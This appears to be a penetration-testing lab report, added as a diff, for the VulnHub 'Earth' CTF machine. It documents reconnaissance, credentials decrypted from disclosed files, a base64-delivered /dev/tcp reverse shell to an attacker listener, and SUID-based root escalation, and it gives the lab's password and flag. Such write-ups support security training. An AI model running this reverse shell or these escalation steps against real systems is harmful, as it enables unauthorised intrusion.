@@ -1,0 +1,84 @@
+===============================================================================
+                       PENETRATION TESTING LAB REPORT                          
+===============================================================================
+Target IP:      192.168.0.104
+Target Host:    Earth (VulnHub CTF Lab)
+Course Context: Certified Ethical Hacker (CEH v13)
+Objective:      Documentation of Enumeration, Exploitation, and Root Escalation
+
+-------------------------------------------------------------------------------
+1. TARGET INFORMATION & RECONNAISSANCE
+-------------------------------------------------------------------------------
+* Nmap Scan Results:
+  - Port 22/tcp:  Open (OpenSSH 8.6)
+  - Port 80/tcp:  Open (Apache httpd 2.4.51 / Fedora / OpenSSL 1.1.1l)
+  - Port 443/tcp: Open (Apache httpd 2.4.51 / Fedora / OpenSSL 1.1.1l)
+
+* Domain Names Discovered:
+  - 1.earth.local
+  - 2.terratest.earth.local
+
+* Command Execution Log (Recon Phase):
+  $ nmap -sn 192.168.0.0/24
+  $ sudo nmap --script ssl-cert -p 443 192.168.0.104
+  $ gobuster dir -u https://terratest.earth.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt,php,html
+
+-------------------------------------------------------------------------------
+2. ENUMERATION & DISCLOSURES
+-------------------------------------------------------------------------------
+* Gobuster Findings on terratest.earth.local:
+  - /index.html (Status: 200)
+  - /robots.txt (Status: 200)
+
+* Discovered File Contents:
+  - robots.txt revealed a restricted path: /testingnotes.*
+  - /testingnotes.txt disclosed:
+      1. Messaging system uses custom XOR encryption.
+      2. testdata.txt was used as sample data for encryption testing.
+      3. Valid username: terra
+  - /testdata.txt provided the plaintext base string used for encryption testing.
+
+* Decrypted Credentials:
+  - Username: terra
+  - Password: earthclimatechangebad4humans
+
+-------------------------------------------------------------------------------
+3. FOOTHOLD & SHELL ACCESS
+-------------------------------------------------------------------------------
+* Exploitation Vector:
+  - Authenticated to admin portal using credentials (terra / earthclimatechangebad4humans).
+  - Located command input feature within the messaging interface.
+  - Initial command output confirmed web execution under the 'apache' user context (uid=48).
+
+* Reverse Shell Execution:
+  - Payload: sh -i >& /dev/tcp/192.168.0.107/9001 0>&1
+  - Delivered via base64 encoding to bypass interface input restrictions.
+  - Listener started via netcat on Kali host (nc -lvnp 9001).
+  - Connection established as apache user.
+
+-------------------------------------------------------------------------------
+4. USER FLAG & PRIVILEGE ESCALATION
+-------------------------------------------------------------------------------
+* User Flag Location:
+  - Path: /var/earth_web/user_flag.txt
+  - Value: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
+
+* SUID Binary Discovery:
+  - Executed command: find / -perm -u=s -type f 2>/dev/null
+  - Identified target binary: /usr/bin/reset_root
+
+* Binary Analysis & Trigger Identification:
+  - Dynamic library tracing (ltrace) on /usr/bin/reset_root revealed access() checks:
+      1. /dev/shm/kHgTFI5G
+      2. /dev/shm/Zw7bV9U5
+      3. /tmp/kcM0Wewe
+  - Required trigger files created via touch command:
+      $ touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
+
+* Root Escalation Execution:
+  - Executed /usr/bin/reset_root following trigger creation.
+  - Trigger conditions met; root password reset completed successfully.
+
+===============================================================================
+                               END OF REPORT                                  
+===============================================================================
